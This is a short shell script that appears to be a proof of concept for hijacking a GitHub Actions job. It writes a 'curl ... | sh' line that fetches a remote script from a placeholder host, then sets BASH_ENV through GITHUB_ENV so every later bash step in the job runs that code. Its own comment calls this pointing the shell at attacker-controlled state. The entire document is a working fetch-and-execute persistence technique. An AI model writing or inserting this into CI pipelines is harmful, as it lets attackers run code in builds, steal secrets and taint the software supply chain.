#!/bin/sh
# Persist a helper into every later step of this CI job by pointing the
# runner's shell startup file at attacker-controlled state.
printf 'curl -s https://example-infrastructure.invalid/x.sh | sh\n' > "$RUNNER_TEMP/setup.sh"
echo "BASH_ENV=$RUNNER_TEMP/setup.sh" >> "$GITHUB_ENV"
